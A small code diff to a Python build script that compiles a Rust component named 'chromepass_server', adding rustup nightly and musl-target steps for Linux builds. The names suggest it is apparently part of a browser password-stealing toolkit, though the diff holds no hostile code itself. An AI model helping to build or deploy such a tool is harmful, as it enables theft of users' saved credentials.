@@ -109,7 +109,9 @@ def build_server(filename="server", icon="server.ico", port=80, nobuild=True, li
     with open(build_path, "w") as f:
         f.write(content)
     if linux:
-        build_command = f"{refresh_env}cd {template_dir}\\{chromepass_server}; cargo build --release --target x86_64-unknown-linux-musl"
+        nightly = f"{refresh_env}rustup default nightly"
+        musl_target = f"{refresh_env}rustup target add x86_64-unknown-linux-musl"
+        build_command = f"{refresh_env}cd {template_dir}\\{chromepass_server};{nightly};{musl_target};cargo build --release --target x86_64-unknown-linux-musl"
     else:
         build_command = f"{refresh_env}cd {template_dir}\\{chromepass_server}; cargo build --release;"
     if os.path.exists(temp_path) and not nobuild:
